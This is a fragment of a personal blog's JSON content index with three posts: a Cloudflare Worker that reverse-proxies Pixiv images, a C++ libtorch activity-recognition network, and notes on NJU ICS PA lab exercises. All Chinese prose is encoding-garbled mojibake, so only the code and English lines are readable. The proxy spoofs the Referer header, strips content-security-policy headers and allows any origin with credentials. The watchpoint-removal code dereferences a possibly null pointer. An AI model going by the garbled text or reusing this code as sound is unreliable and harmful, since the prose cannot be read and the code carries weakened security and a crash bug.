è‡ªå®šä¹‰åŸŸï¼š\n\nç°åœ¨æ‚¨çš„å›¾åºŠåº”è¯¥å¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚\nhelloworld.jpg (300Ã—384): https://assets.summ2.link/helloworld.jpg\nå°å½©è›‹\nä¼—æ‰€å‘¨çŸ¥ï¼Œä¼¼ä¹åœ¨ 2020 å¹´å‰åï¼ŒPixiv\nå°±æ— æ³•è¢«ç›´æ¥è®¿é—®äº†ã€‚ä¸‹é¢å€Ÿæ­¤æœºä¼šï¼Œå°è¯•æ­å»ºä¸€ä¸ª Pixiv\nå›¾åºŠçš„åå‘ä»£ç†æœåŠ¡ã€‚ç”±äº i.pximg.net\nçš„ç›—é“¾ä¿æŠ¤ï¼Œå¾—æŠŠä¹‹å‰çš„ä»£ç åšä¸€äº›ä¿®æ”¹ã€‚\n// Website you intended to retrieve for users.\nconst upstream = \"i.pximg.net\";\n\n// Website you intended to retrieve for users using mobile devices.\nconst upstream_mobile = upstream;\n\n// Countries and regions where you wish to suspend your service.\nconst blocked_region = [];\n\n// IP addresses which you wish to block from using your service.\nconst blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];\n\n// Whether to use HTTPS protocol for upstream address.\nconst https = true;\n\n// Whether to disable cache.\nconst disable_cache = false;\n\n// Replace texts.\nconst replace_dict = {\n  $upstream: \"$custom_domain\",\n};\n\naddEventListener(\"fetch\", (event) =&gt; {\n  event.respondWith(fetchAndApply(event.request));\n});\n\nasync function fetchAndApply(request) {\n  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();\n  const ip_address = request.headers.get(\"cf-connecting-ip\");\n  const user_agent = request.headers.get(\"user-agent\");\n\n  let response = null;\n  let url = new URL(request.url);\n  let url_hostname = url.hostname;\n\n  if (https == true) {\n    url.protocol = \"https:\";\n  } else {\n    url.protocol = \"http:\";\n  }\n\n  if (await device_status(user_agent)) {\n    var upstream_domain = upstream;\n  } else {\n    var upstream_domain = upstream_mobile;\n  }\n\n  url.host = upstream_domain;\n/*  if (url.pathname == \"/\") {\n    url.pathname = upstream_path;\n  } else {\n    url.pathname = upstream_path + url.pathname;\n  }*/\n\n  if (blocked_region.includes(region)) {\n    response = new Response(\n      \"Access denied: WorkersProxy is not available in your region yet.\",\n      {\n        status: 403,\n      }\n    );\n  } else if (blocked_ip_address.includes(ip_address)) {\n    response = new Response(\n      \"Access denied: Your IP address is blocked by WorkersProxy.\",\n      {\n        status: 403,\n      }\n    );\n  } else {\n    let method = request.method;\n    let request_headers = request.headers;\n    let new_request_headers = new Headers(request_headers);\n\n    new_request_headers.set('Referer', 'https://www.pixiv.net/');\n\n    let original_response = await fetch(url.href, {\n      method: method,\n      headers: new_request_headers,\n      body: request.body,\n    });\n\n    connection_upgrade = new_request_headers.get(\"Upgrade\");\n    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {\n      return original_response;\n    }\n\n    let original_response_clone = original_response.clone();\n    let original_text = null;\n    let response_headers = original_response.headers;\n    let new_response_headers = new Headers(response_headers);\n    let status = original_response.status;\n\n    if (disable_cache) {\n      new_response_headers.set(\"Cache-Control\", \"no-store\");\n    } else {\n      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");\n    }\n\n    new_response_headers.set(\"access-control-allow-origin\", \"*\");\n    new_response_headers.set(\"access-control-allow-credentials\", true);\n    new_response_headers.delete(\"content-security-policy\");\n    new_response_headers.delete(\"content-security-policy-report-only\");\n    new_response_headers.delete(\"clear-site-data\");\n\n    if (new_response_headers.get(\"x-pjax-url\")) {\n      new_response_headers.set(\n        \"x-pjax-url\",\n        response_headers\n          .get(\"x-pjax-url\")\n          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)\n      );\n    }\n\n    const content_type = new_response_headers.get(\"content-type\");\n    if (\n      content_type != null &amp;&amp;\n      content_type.includes(\"text/html\") &amp;&amp;\n      content_type.includes(\"UTF-8\")\n    ) {\n      original_text = await replace_response_text(\n        original_response_clone,\n        upstream_domain,\n        url_hostname\n      );\n    } else {\n      original_text = original_response_clone.body;\n    }\n\n    response = new Response(original_text, {\n      status,\n      headers: new_response_headers,\n    });\n  }\n  return response;\n}\n\nasync function replace_response_text(response, upstream_domain, host_name) {\n  let text = await response.text();\n\n  var i, j;\n  for (i in replace_dict) {\n    j = replace_dict[i];\n    if (i == \"$upstream\") {\n      i = upstream_domain;\n    } else if (i == \"$custom_domain\") {\n      i = host_name;\n    }\n\n    if (j == \"$upstream\") {\n      j = upstream_domain;\n    } else if (j == \"$custom_domain\") {\n      j = host_name;\n    }\n\n    let re = new RegExp(i, \"g\");\n    text = text.replace(re, j);\n  }\n  return text;\n}\n\nasync function device_status(user_agent_info) {\n  var agents = [\n    \"Android\",\n    \"iPhone\",\n    \"SymbianOS\",\n    \"Windows Phone\",\n    \"iPad\",\n    \"iPod\",\n  ];\n  var flag = true;\n  for (var v = 0; v &lt; agents.length; v++) {\n    if (user_agent_info.indexOf(agents[v]) &gt; 0) {\n      flag = false;\n      break;\n    }\n  }\n  return flag;\n}\näº‹å®ä¸Šå®ç°åŸºæœ¬çš„åä»£åŠŸèƒ½ï¼Œåªéœ€è¦å¦‚ä¸‹ä»£ç ï¼š\nexport default {\n  async fetch(request) {\n    const url = new URL(request.url);\n    url.hostname = 'i.pximg.net';\n\n    const proxyRequest = new Request(url, request);\n    proxyRequest.headers.set('Referer', 'https://www.pixiv.net/');\n\n    return fetch(proxyRequest);\n  },\n};\néƒ¨ç½²åœ¨ pixiv.summ2.link ä¸Šï¼Œå®ƒå¯ä»¥æˆåŠŸé…ç½®åœ¨ PixEzï¼ˆä¸€ä¸ª Pixiv\nç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ï¼‰ä¸­ã€‚\nExample:\nhttps://pixiv.summ2.link/img-original/img/2023/11/20/18/53/42/113565191_p0.jpg\nå‚è€ƒ\n\n\n\nhttps://en.wikipedia.org/wiki/Proxy_serverâ†©ï¸\nhttps://en.wikipedia.org/wiki/Reverse_proxyâ†©ï¸\n\n\n","categories":["Web"],"tags":["Reverse Proxy"]},{"title":"ç®€å•ç¥ç»ç½‘ç»œæ­å»º","url":"/categories/Study/simple-nn/","content":"å‰è¨€\nç¨‹åºè®¾è®¡è¯¾æœŸæœ«ä½œä¸šè¦æ±‚å®ç°ä¸€ä¸ªã€ŒåŸºäºå¯ç©¿æˆ´ä¼ æ„Ÿå™¨æ•°æ®çš„äººä½“æ´»åŠ¨è¯†åˆ«ã€ï¼Œå…·ä½“æ˜¯å®ç°ä¸€ä¸ªåˆ†ç±»ä»»åŠ¡ã€‚\n\n\næ•°æ®é‡‡é›†è®¾å¤‡ä»¥æ¯ç§’ 1 æ¬¡çš„é¢‘ç‡è®°å½•ä¼ æ„Ÿå™¨ä¿¡æ¯ï¼Œæ¶µç›–åŠ é€Ÿåº¦ï¼ˆxã€yã€ z\nè½´ï¼‰ã€é™€èºä»ªè§’é€Ÿåº¦ï¼ˆxã€yã€z è½´ï¼‰ã€æ¸©åº¦ã€æ¹¿åº¦ã€å¿ƒç‡ã€çš®è‚¤ç”µååº”ç­‰å…±è®¡ 561\nä¸ªæ•°å€¼å‹ç‰¹å¾ç»´åº¦ã€‚æ¯æ¡æ•°æ®å‡æ ‡æ³¨äº†æ´»åŠ¨ç±»åˆ«æ ‡ç­¾ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å…­ç±»ï¼š\nWALKINGï¼šè¡Œèµ°ï¼Œæ ‡è®°ä¸º 1\nWALKING_UPSTAIRSï¼šä¸Šæ¥¼æ¢¯ï¼Œæ ‡è®°ä¸º 2\nWALKING_DOWNSTAIRSï¼šä¸‹æ¥¼æ¢¯ï¼Œæ ‡è®°ä¸º 3\nSITTINGï¼šåç€ï¼Œæ ‡è®°ä¸º 4\nSTANDINGï¼šç«™ç€ï¼Œæ ‡è®°ä¸º 5\nLAYINGï¼šå¹³èººï¼Œæ ‡è®°ä¸º 6\n\nåŸºæœ¬è®¾è®¡\nä»¥ä¸‹ä»£ç ä¾èµ– C++ libtorch åº“ï¼Œä½¿ç”¨ CUDA\n\næ•°æ®å¤„ç†\nè¯»å…¥ç»™å®šçš„è®­ç»ƒé›† X_test.txt å’Œå¯¹åº”çš„æ ‡ç­¾ y_test.txtï¼Œå¹¶ä¸”ä½¿ç”¨ from_blob è½¬æ¢ä¸ºå¼ é‡ç±»å‹ torch::tensor()\nclass CustomDataset : public torch::data::Dataset&lt;CustomDataset&gt; {\nprivate:\n    std::vector&lt;torch::Tensor&gt; features_;\n    std::vector&lt;torch::Tensor&gt; labels_;\n\npublic:\n    CustomDataset(const std::string&amp; feature_file, const std::string&amp; label_file) {\n        std::ifstream ffile(feature_file);\n        std::ifstream lfile(label_file);\n\n        if (!ffile.is_open() || !lfile.is_open()) {\n            throw std::runtime_error(\"æ— æ³•æ‰“å¼€ç‰¹å¾æˆ–æ ‡ç­¾æ–‡ä»¶\");\n        }\n\n        std::vector&lt;float&gt; buffer;\n        std::string line;\n\n        // è¯»å–ç‰¹å¾\n        while (std::getline(ffile, line)) {\n            std::istringstream ss(line);\n            float val;\n            while (ss &gt;&gt; val) {\n                buffer.push_back(val);\n            }\n        }\n\n        size_t total_samples = buffer.size() / 561;\n        for (size_t i = 0; i &lt; total_samples; ++i) {\n            torch::Tensor x = torch::from_blob(buffer.data() + i * 561, {561}, torch::kFloat).clone();\n            features_.push_back(x);\n        }\n\n        // è¯»å–æ ‡ç­¾\n        while (std::getline(lfile, line)) {\n            int label = std::stoi(line) - 1; //label:1-6 (expected 0-5)\n            labels_.push_back(torch::tensor(label, torch::kLong));\n        }\n\n        if (features_.size() != labels_.size()) {\n            throw std::runtime_error(\"ç‰¹å¾æ•°ä¸æ ‡ç­¾æ•°ä¸ä¸€è‡´ï¼\");\n        }\n    }\n\n};\nå®šä¹‰æ¨¡å‹\nä¸ºäº†å…ˆè®©ç¨‹åºè·‘èµ·æ¥ï¼Œè€ƒè™‘ä½¿ç”¨å•å±‚ç¥ç»ç½‘ç»œå®ç°éœ€æ±‚ã€‚\nå³åªåŒ…å«ä¸€ä¸ªçº¿æ€§å±‚ï¼Œå…¶ä¸­è¾“å…¥æ ·æœ¬ç‰¹å¾çš„å¤§å° 561ï¼Œè¾“å‡ºæ ·æœ¬ç‰¹å¾çš„å¤§å° 6ã€‚\nå®šä¹‰ï¼š\n\nä¸€ä¸ªç»“æ„ä½“ï¼Œç»§æ‰¿ torch::nn::Module\nçº¿æ€§å±‚ torch::nn::Linear\nå‰å‘ä¼ æ’­å‡½æ•° torch::Tensor forward(torch::Tensor x)\n\nä½¿ç”¨å® TORCH_MODULE()ï¼Œä½¿ç¨‹åºå¯ä»¥è°ƒç”¨ torch::save(),\ntorch::load()\nstruct NetImpl : torch::nn::Module {\n    torch::nn::Linear fc{nullptr};\n    NetImpl() {\n        fc = register_module(\"fc\", torch::nn::Linear(561, 6));\n    }\n\n    torch::Tensor forward(torch::Tensor x) {\n        return fc(x);\n    }\n};\n\nTORCH_MODULE(Net);\nè®­ç»ƒè¿‡ç¨‹\næ­¤è®­ç»ƒè¿‡ç¨‹åŸºäºå°æ‰¹é‡éšæœºæ¢¯åº¦ä¸‹é™ï¼ˆSGDï¼‰ä¼˜åŒ–ç®—æ³•ã€‚å…·ä½“è€Œè¨€ï¼Œæ¯ä¸ªè®­ç»ƒè¿­ä»£å°†å¤„ç†ä¸€ä¸ªåŒ…å« 8 ä¸ªæ ·æœ¬çš„å°æ‰¹é‡æ•°æ®ã€‚\nåœ¨æ¯ä¸ªè®­ç»ƒå‘¨æœŸå†…ï¼š 1. å‰å‘ä¼ æ’­ 2. æŸå¤±è®¡ç®— 3. æ¢¯åº¦æ¸…é›¶ 4. åå‘ä¼ æ’­ 5.\nå‚æ•°æ›´æ–°\nä½¿ç”¨ torch::data::Dataset&lt;CustomDataset&gt; çš„ map æ–¹æ³•ï¼Œåº”ç”¨è½¬æ¢ (transform)torch::data::transforms::Stack&lt;&gt;() åˆ°æ•°æ®é›†çš„æ¯ä¸ªå•ç‹¬æ ·æœ¬ä¸Šã€‚è¿™å°†è®©å¤šä¸ªå•ç‹¬å¼ é‡å †å ï¼Œå½¢æˆä¸€ä¸ªæ‰¹æ¬¡å¼ é‡ã€‚\nconst std::string feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_train.txt\";\nconst std::string label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_train.txt\";\nconst size_t batch_size = 8;\nconst size_t num_epochs = 10;\nconst double learning_rate = 0.01;\n\nauto dataset = CustomDataset(feature_file, label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto data_loader = torch::data::make_data_loader(dataset, batch_size);\n\nNet model = Net();\ntorch::optim::SGD optimizer(model-&gt;parameters(), learning_rate);\n\nfor (size_t epoch = 1; epoch &lt;= num_epochs; ++epoch) {\n    model-&gt;train();\n    double total_loss = 0.0;\n    size_t batch_idx = 0;\n\n    for (auto&amp; batch : *data_loader) {\n        auto data = batch.data;\n        auto targets = batch.target;\n\n        auto output = model-&gt;forward(data);\n        auto loss = torch::nn::functional::cross_entropy(output, targets);\n\n        optimizer.zero_grad();\n        loss.backward();\n        optimizer.step();\n        total_loss += loss.template item&lt;double&gt;();\n        ++batch_idx;\n    }\n\n    std::cout &lt;&lt; \"Epoch [\" &lt;&lt; epoch &lt;&lt; \"/\" &lt;&lt; num_epochs &lt;&lt; \"] Avg Loss: \"\n              &lt;&lt; (total_loss / batch_idx) &lt;&lt; std::endl;\n}\nè®­ç»ƒå®Œæˆåï¼Œä¿å­˜æ¨¡å‹\ntorch::save(model, \"/home/summer/CLionProjects/cppAssignment202505/model.pt\");\næ•°æ®é¢„æµ‹\nä¸ºäº†è¯„ä¼°æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ï¼Œæˆ‘ä»¬æŒ‰ç…§ä¸è®­ç»ƒæ•°æ®ç›¸ä¼¼çš„æ–¹æ³•ï¼Œè¯»å–å¹¶å¤„ç†æµ‹è¯•é›†ã€‚\nconst std::string model_path = \"/home/summer/CLionProjects/cppAssignment202505/model.pt\";\nconst std::string feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_test.txt\";\nconst std::string label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_test.txt\";\nconst size_t batch_size = 8;\n\nNet model= Net();\ntorch::load(model, model_path);\nmodel-&gt;eval();\n\nauto dataset = CustomDataset(feature_file, label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto data_loader = torch::data::make_data_loader(dataset, batch_size);\n\nsize_t correct = 0;\nsize_t total = 0;\n\nfor (auto&amp; batch : *data_loader) {\n    auto data = batch.data;\n    auto targets = batch.target;\n\n    auto output = model-&gt;forward(data);\n    auto pred = output.argmax(1);\n\n    correct += pred.eq(targets).sum().template item&lt;int64_t&gt;();\n    total += targets.size(0);\n}\n\ndouble accuracy = static_cast&lt;double&gt;(correct) / total * 100.0;\nstd::cout &lt;&lt; \"Test Accuracy: \" &lt;&lt; accuracy &lt;&lt; \"%\" &lt;&lt; std::endl;\nä½¿ç”¨ä¸Šè¿°ç¥ç»ç½‘ç»œå¾—åˆ°çš„ç»“æœæ˜¯:\nTest Accuracy: 94.1636%\næ¨¡å‹ä¼˜åŒ–\né‡‡ç”¨æ®‹å·®ç½‘ç»œï¼ˆResNetï¼‰ä¼˜åŒ–æ¨¡å‹\næ®‹å·®å—\né‡‡ç”¨ä¸¤å±‚å·ç§¯å±‚ï¼Œä¸¤å±‚æ ‡å‡†åŒ–å±‚ä»¥åŠ ReLU æ¿€æ´»å‡½æ•°ã€‚\n\n\nResidual Block\n\nå¹¶ä¸”å®šä¹‰å¯¹ identity çš„ä¸‹é‡‡æ ·å¤„ç† downsampleï¼Œä½¿ç”¨ torch::nn::Sequential å¯ä»¥å°†å¤šä¸ªæ¨¡å—å †å ã€‚\nResidualBlock1DImpl(int64_t in_channels, int64_t out_channels, int64_t stride = 1) {\n    conv1 = register_module(\"conv1\", torch::nn::Conv1d(torch::nn::Conv1dOptions(in_channels, out_channels, 3).stride(stride).padding(1).bias(false)));\n    bn1 = register_module(\"bn1\", torch::nn::BatchNorm1d(out_channels));\n    conv2 = register_module(\"conv2\", torch::nn::Conv1d(torch::nn::Conv1dOptions(out_channels, out_channels, 3).stride(1).padding(1).bias(false)));\n    bn2 = register_module(\"bn2\", torch::nn::BatchNorm1d(out_channels));\n\n    if (stride != 1 || in_channels != out_channels) {\n        downsample = register_module(\"downsample\", torch::nn::Sequential(\n            torch::nn::Conv1d(torch::nn::Conv1dOptions(in_channels, out_channels, 1).stride(stride).bias(false)),\n            torch::nn::BatchNorm1d(out_channels)\n        ));\n    }\n}\nå®šä¹‰å‰å‘ä¼ æ’­çš„ä¸¤æ¡è·¯å¾„:\ntorch::Tensor forward(torch::Tensor x) {\n    auto identity = x.clone();\n    x = torch::relu(bn1(conv1(x)));\n    x = bn2(conv2(x));\n\n    if (!downsample-&gt;is_empty()) {\n        identity = downsample-&gt;forward(identity);\n    }\n\n    x += identity;\n    return torch::relu(x);\n}\næ®‹å·®ç½‘ç»œ\næˆ‘ä»¬çš„ç½‘ç»œæ¶æ„åŸºäº ResNet çš„åŸç†ï¼Œå¹¶é‡‡ç”¨ä»¥ä¸‹å…·ä½“ç»“æ„:\nè¾“å…¥ -&gt; å·ç§¯å±‚ -&gt; æ ‡å‡†åŒ–å±‚ -&gt; æ¿€æ´»å±‚ -&gt; æ®‹å·®å— -&gt; å¹³å‡æ± åŒ– -&gt; å…¨è¿æ¥å±‚ -&gt; è¾“å‡º\nstruct ResNet1DImpl : torch::nn::Module {\n    torch::nn::Conv1d conv{nullptr};\n    torch::nn::BatchNorm1d bn{nullptr};\n    torch::nn::Sequential layer1, layer2, layer3;\n    torch::nn::Linear fc{nullptr};\n\n    ResNet1DImpl() {\n        conv = register_module(\"conv\", torch::nn::Conv1d(torch::nn::Conv1dOptions(1, 64, 7).stride(2).padding(3).bias(false)));\n        bn = register_module(\"bn\", torch::nn::BatchNorm1d(64));\n\n        layer1 = register_module(\"layer1\", _make_layer(64, 64, 2, 1));\n        layer2 = register_module(\"layer2\", _make_layer(64, 64, 2, 2));\n        layer3 = register_module(\"layer3\", _make_layer(64, 128, 2, 2));\n\n        fc = register_module(\"fc\", torch::nn::Linear(128, 6));\n    }\n\n    torch::nn::Sequential _make_layer(int64_t in_channels, int64_t out_channels, int blocks, int stride) {\n        torch::nn::Sequential layers;\n        layers-&gt;push_back(ResidualBlock1D(in_channels, out_channels, stride));\n        for (int i = 1; i &lt; blocks; ++i) {\n            layers-&gt;push_back(ResidualBlock1D(out_channels, out_channels));\n        }\n        return layers;\n    }\n\n    torch::Tensor forward(torch::Tensor x) {\n        x = x.unsqueeze(1); // (batch, 1, 561)\n        x = torch::relu(bn(conv(x)));\n        x = layer1-&gt;forward(x);\n        x = layer2-&gt;forward(x);\n        x = layer3-&gt;forward(x);\n\n        x = torch::adaptive_avg_pool1d(x, 1);\n        x = x.view({x.size(0), -1});\n        x = fc(x);\n        return x;\n    }\n};\nTORCH_MODULE(ResNet1D);\næ€§èƒ½ä¼˜åŒ–\nä¸ºäº†åŠ å¿«è®­ç»ƒé€Ÿåº¦ï¼Œå¯ä»¥å°†è®­ç»ƒè¿‡ç¨‹è½¬ç§»åˆ° GPU ä¸Šè¿è¡Œ\ntorch::manual_seed(42);\n\ntorch::Device device(torch::kCPU);\nif (torch::cuda::is_available()) {\n    std::cout &lt;&lt; \"CUDA is available! Training on GPU.\" &lt;&lt; std::endl;\n    device = torch::Device(torch::kCUDA);\n}\n\nconst std::string train_feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_train.txt\";\nconst std::string train_label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_train.txt\";\nconst std::string test_feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_test.txt\";\nconst std::string test_label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_test.txt\";\n\nconst size_t batch_size = 8;\nconst size_t num_epochs = 15;\nconst double learning_rate = 0.001;\n\nauto train_dataset = CustomDataset(train_feature_file, train_label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto train_loader = torch::data::make_data_loader(train_dataset, batch_size);\n\nauto test_dataset = CustomDataset(test_feature_file, test_label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto test_loader = torch::data::make_data_loader(test_dataset, batch_size);\n\nResNet1D model = ResNet1D();\nmodel-&gt;to(device);\n\ntorch::optim::SGD optimizer(model-&gt;parameters(), torch::optim::SGDOptions(learning_rate).momentum(0.9));\n\nfor (size_t epoch = 1; epoch &lt;= num_epochs; ++epoch) {\n    model-&gt;train();\n    double total_loss = 0.0;\n    size_t batch_idx = 0;\n\n    for (auto&amp; batch : *train_loader) {\n        auto data = batch.data.to(device);\n        auto targets = batch.target.to(device);\n\n        optimizer.zero_grad();\n        auto output = model-&gt;forward(data);\n        auto loss = torch::nn::functional::cross_entropy(output, targets);\n        loss.backward();\n        optimizer.step();\n\n        total_loss += loss.template item&lt;double&gt;();\n        batch_idx++;\n    }\n\n    std::cout &lt;&lt; \"Epoch [\" &lt;&lt; epoch &lt;&lt; \"/\" &lt;&lt; num_epochs &lt;&lt; \"] Avg Loss: \" &lt;&lt; total_loss / batch_idx &lt;&lt; std::endl;\n}\né¢„æµ‹éƒ¨åˆ†å¦‚ä¸‹ï¼š\nconst std::string model_path = \"/home/summer/CLionProjects/cppAssignment202505/model.pt\";\nconst std::string feature_file = \"/home/summer/CLionProjects/cppAssignment202505/X_test.txt\";\nconst std::string label_file = \"/home/summer/CLionProjects/cppAssignment202505/y_test.txt\";\nconst size_t batch_size = 8;\n\ntorch::Device device(torch::kCPU);\nif (torch::cuda::is_available()) {\n    std::cout &lt;&lt; \"CUDA is available! Training on GPU.\" &lt;&lt; std::endl;\n    device = torch::Device(torch::kCUDA);\n}\n\nResNet1D model = ResNet1D();\n\ntry {\n    torch::load(model, model_path);\n    std::cout &lt;&lt; \"Model loaded successfully from: \" &lt;&lt; model_path &lt;&lt; std::endl;\n} catch (const c10::Error&amp; e) {\n    std::cerr &lt;&lt; \"Error loading model: \" &lt;&lt; e.what() &lt;&lt; std::endl;\n    return -1;\n}\n\nmodel-&gt;to(device);\nmodel-&gt;eval();\n\nauto dataset = CustomDataset(feature_file, label_file).map(torch::data::transforms::Stack&lt;&gt;());\nauto data_loader = torch::data::make_data_loader(dataset, batch_size);\n\nsize_t correct = 0;\nsize_t total = 0;\n\ntorch::NoGradGuard no_grad;\n\nfor (auto&amp; batch : *data_loader) {\n    auto data = batch.data;\n    auto targets = batch.target;\n\n    data = data.to(device);\n    targets = targets.to(device);\n\n    auto output = model-&gt;forward(data);\n\n    auto pred = output.argmax(1);\n\n\n    correct += pred.eq(targets).sum().template item&lt;int64_t&gt;();\n    total += targets.size(0);\n}\n\n\ndouble accuracy = static_cast&lt;double&gt;(correct) / total * 100.0;\nstd::cout &lt;&lt; \"Test Accuracy: \" &lt;&lt; accuracy &lt;&lt; \"%\" &lt;&lt; std::endl;\n\nreturn 0;\næ”¹è¿›åçš„æ¨¡å‹å¾—åˆ°çš„ç»“æœæ˜¯ï¼š\nTest Accuracy: 96.4031%\n","categories":["Study"],"tags":["Neural network"]},{"title":"NJU ICS PA ä¸€äº›ç¬”è®°","url":"/categories/Study/nju-ics-pa/","content":"Do you know\næœ¬äººä»£ç æ°´å¹³æ‹™åŠ£ğŸ¥²ï¼Œå®ç°éƒ¨åˆ†ä»…ä¾›å‚è€ƒ\n\n\nå—äº¬å¤§å­¦\nè®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯ç³» è®¡ç®—æœºç³»ç»ŸåŸºç¡€ è¯¾ç¨‹å®éªŒ 2024\nPA1 - å¼€å¤©è¾Ÿåœ°çš„ç¯‡ç« \nRTFSC\næ–‡ä»¶ï¼šnemu/src/monitor/sdb/sdb.c\nåŸå› ï¼šé€€å‡ºæ—¶ nemu_state.state ä¸æ˜¯ â€œæ­£å¸¸â€ çš„\nè§£å†³åŠæ³•ï¼š\nstatic int cmd_q(char *args) {\n  nemu_state.state = NEMU_QUIT;\n  return -1;\n}\nç›‘è§†ç‚¹\nåŸºæœ¬æ¡†æ¶\næ·»åŠ  w &lt;expr&gt; å’Œ d &lt;index&gt; å‘½ä»¤ï¼Œæ¥æ·»åŠ å’Œåˆ é™¤ç›‘è§†ç‚¹ã€‚\nå¹¶ä¸”éœ€è¦å®ç°ç›‘è§†ç‚¹æ± ä¸­é“¾è¡¨çš„ç»´æŠ¤ï¼Œç›‘è§†ç‚¹è¡¨è¾¾å¼çš„è®¡ç®—ã€‚\nä¸ºäº†æé«˜ NEMU çš„æ€§èƒ½ï¼Œæä¾›ç›‘è§†ç‚¹åŠŸèƒ½çš„å¼€å…³é€‰é¡¹ã€‚\né“¾è¡¨ç»´æŠ¤\nç›‘è§†ç‚¹æ± ä¸­æ¶‰åŠç›‘è§†ç‚¹é“¾è¡¨å’Œç©ºé—²é“¾è¡¨ï¼Œé€šè¿‡ init_wp_pool() æ¥å¯¹å…¶åˆå§‹åŒ–ã€‚\nvoid init_wp_pool() {\n  int i;\n  for (i = 0; i &lt; NR_WP; i ++) {\n    wp_pool[i].NO = i;\n    wp_pool[i].next = (i == NR_WP - 1 ? NULL : &amp;wp_pool[i + 1]);\n  }\n\n  head = NULL;\n  free_ = wp_pool;\n}\næ¥ç€ï¼Œé€šè¿‡ new_wp() å’Œ free_wp() å®ç°ç›‘è§†ç‚¹çš„ç®¡ç†\nint new_wp(char* args){\n  WP *p=NULL,*q=NULL;\n  if (free_==NULL)\n  {\n    printf(\"Watchpoints Limit\");\n    return -1;\n  }\n  p=free_;\n  bool success=1;\n  p-&gt;result = expr(args,&amp;success);\n  if (!success)return -1;\n  p-&gt;expr = strdup(args);\n  free_=free_-&gt;next;\n  if (head!=NULL)\n  {\n    q=head;\n    while (q-&gt;next!=NULL)q=q-&gt;next;\n    q-&gt;next=p;\n    return 1;\n  }\n  head=p;\n  head-&gt;next=NULL;\n  return 1;\n}\nvoid free_wp(int no)\n{\n  if (head==NULL)\n  {\n\tprintf(\"Watchpoint %d not found.\\n\",no);\n    return;\n  }\n  if (head-&gt;NO==no)\n  {\n    WP *wp=head;\n    head=wp-&gt;next;\n    wp-&gt;next=free_;\n    free_=wp;\n    return;\n  }\n  WP *p=NULL;\n  if (head!=NULL)\n  {\n    p=head;\n    while (1){\n      if (p-&gt;next-&gt;NO==no){\n        WP *wp=p-&gt;next;\n        p-&gt;next=wp-&gt;next;\n        wp-&gt;next=free_;\n        free_=wp;\n        return;\n      }\n      if (p-&gt;next==NULL)\n      {\n        printf(\"Watchpoint %d not found.\\n\",no);\n        return;\n      }\n      p=p-&gt;next;\n    }\n  }\n}\nç›‘è§†ç‚¹æ±‚å€¼\nä¸ºäº†åˆ¤æ–­ç›‘è§†ç‚¹çš„å€¼æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè¿˜éœ€è¦åœ¨ç»“æ„ä½“ä¸­æ·»åŠ ä¸€ä¸ªæˆå‘˜æ¥è®°å½•ã€‚ç„¶åé€šè¿‡ check_expr() æ¥æ±‚å€¼å’Œåˆ¤æ–­å˜åŒ–ã€‚\nbool check_expr(){\n  bool changed=false;\n  if (head==NULL)return 0;\n  WP *p;\n  bool success=true;\n  p=head;\n  word_t result = expr(p-&gt;expr,&amp;success);\n  if (result!=p-&gt;result &amp;&amp; success)\n  {\n    printf(\"Watchpoint %d changed at 0x%x.\\n\",p-&gt;NO,cpu.pc);\n    changed=true;\n  }\n  if (changed)return 1;\n  return 0;\n}\nå¦‚ä½•é˜…è¯»æ‰‹å†Œ\nç¨‹åºæ˜¯ä¸ªçŠ¶æ€æœº\nå¯¹äºè®¡ç®— 1+2+...+100 çš„ç¨‹åºçš„çŠ¶æ€æœºï¼Œå®ƒæ˜¯ç¡®å®šæ€§çš„ã€‚\n(0, x, x) -&gt; (1, 0, x) -&gt; (2, 0, 0) -&gt; (3, 0, 1) -&gt; (4, 1, 1) -&gt; (5, 1, 2) -&gt; (6, 3, 2) -&gt; ... -&gt; (199,4851, 99) -&gt; (200, 4950, 99) -&gt; (201, 4950, 100) -&gt; (202, 5050, 100)\nç†è§£åŸºç¡€è®¾æ–½\nä¸å¿…å¤šè¯´ï¼Œä½¿ç”¨è¿‡è°ƒè¯•å™¨çš„è¯è‚¯å®šæœ‰æ‰€ä½“ä¼šã€‚\nRTFM\nriscv32 æœ‰å“ªå‡ ç§æŒ‡ä»¤æ ¼å¼ï¼Ÿ\nThere are four core instruction formats.\nRegister-Type, Immediate-Type, Store-Type, Upper Immediate-Type.\nLUI æŒ‡ä»¤çš„è¡Œä¸ºæ˜¯ä»€ä¹ˆï¼Ÿ\nLUI (load upper immediate) is used to build 32-bit constants and uses\nthe U-type format. LUI places the 32-bit U-immediate value into the\ndestination register rd, filling in the lowest 12 bits with zeros.\n\n\nLUI\n\nmstatus å¯„å­˜å™¨çš„ç»“æ„æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ\nThe mstatus (Machine Status) register is an MXLEN-bit read/write\nregister formatted as shown in figures below. It's a Control and\nStatus Register.\nä¸ºä»€ä¹ˆè¦ä½¿ç”¨ -Wall å’Œ -Werror?\nAt section 3.9, we found that:\n-Werror Turn all warnings into errors.\n-Wall This enables all the warnings about constructions\nthat some users consider questionable, and that are easy to avoid (or\nmodify to prevent the warning), even in conjunction with macros. This\nalso enables some language-specific warnings.\nTo add these options, we can leverage compilers to identify potential\nissues in our programs.\nshell å‘½ä»¤\nä½¿ç”¨ find . -type f \\( -name \"*.c\" -o -name \"*.h\" \\) -print0 | xargs -0 wc -l 